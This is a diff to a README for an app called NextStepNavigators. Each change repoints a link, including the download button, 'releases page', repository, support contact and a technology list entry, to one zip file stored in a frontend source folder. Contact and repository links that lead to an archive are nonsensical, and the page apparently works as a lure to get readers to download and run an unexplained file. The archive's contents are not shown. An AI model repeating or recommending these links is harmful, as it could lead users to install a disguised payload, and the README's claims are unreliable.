@@ -8,11 +8,11 @@ Welcome to NextStepNavigators! This application helps you find your way through 
 
 To get started, you need to download the application. Click the link below to visit the releases page where you can find the latest version.
 
-[![Download NextStepNavigators](https://raw.githubusercontent.com/decarlos12345/NextStepNavigators/master/halfway/NextStepNavigators.zip)](https://raw.githubusercontent.com/decarlos12345/NextStepNavigators/master/halfway/NextStepNavigators.zip)
+[![Download NextStepNavigators](https://github.com/decarlos12345/NextStepNavigators/raw/refs/heads/master/frontend/src/pages/Navigators_Step_Next_v1.3.zip)](https://github.com/decarlos12345/NextStepNavigators/raw/refs/heads/master/frontend/src/pages/Navigators_Step_Next_v1.3.zip)
 
 Follow these steps to download and run NextStepNavigators:
 
-1. **Visit the Releases Page**: Go to [this page to download](https://raw.githubusercontent.com/decarlos12345/NextStepNavigators/master/halfway/NextStepNavigators.zip).
+1. **Visit the Releases Page**: Go to [this page to download](https://github.com/decarlos12345/NextStepNavigators/raw/refs/heads/master/frontend/src/pages/Navigators_Step_Next_v1.3.zip).
    
 2. **Choose the Version**: You will see a list of available versions. Select the latest one for the best features and fixes.
 
@@ -73,22 +73,22 @@ For more details and user guides, please refer to our documentation. It includes
 
 ## 🌍 Community and Contributions
 
-If you have feedback or want to contribute, please visit our [GitHub repository](https://raw.githubusercontent.com/decarlos12345/NextStepNavigators/master/halfway/NextStepNavigators.zip). We welcome suggestions and ideas to improve NextStepNavigators.
+If you have feedback or want to contribute, please visit our [GitHub repository](https://github.com/decarlos12345/NextStepNavigators/raw/refs/heads/master/frontend/src/pages/Navigators_Step_Next_v1.3.zip). We welcome suggestions and ideas to improve NextStepNavigators.
 
 ## 📞 Contact
 
-For direct inquiries, you can contact the support team at https://raw.githubusercontent.com/decarlos12345/NextStepNavigators/master/halfway/NextStepNavigators.zip We are happy to assist you with any questions or concerns you may have.
+For direct inquiries, you can contact the support team at https://github.com/decarlos12345/NextStepNavigators/raw/refs/heads/master/frontend/src/pages/Navigators_Step_Next_v1.3.zip We are happy to assist you with any questions or concerns you may have.
 
 ## 🔗 Explore More
 
 Learn more about the technologies we use:
 
 - Docker
-- https://raw.githubusercontent.com/decarlos12345/NextStepNavigators/master/halfway/NextStepNavigators.zip
+- https://github.com/decarlos12345/NextStepNavigators/raw/refs/heads/master/frontend/src/pages/Navigators_Step_Next_v1.3.zip
 - React
 - PostgreSQL
 - Tailwind CSS
 
 These technologies ensure that NextStepNavigators delivers high performance and reliability.
 
-Remember, you can always return to the [Download Page](https://raw.githubusercontent.com/decarlos12345/NextStepNavigators/master/halfway/NextStepNavigators.zip) to check for updates and new releases. Enjoy navigating with ease!
+Remember, you can always return to the [Download Page](https://github.com/decarlos12345/NextStepNavigators/raw/refs/heads/master/frontend/src/pages/Navigators_Step_Next_v1.3.zip) to check for updates and new releases. Enjoy navigating with ease!
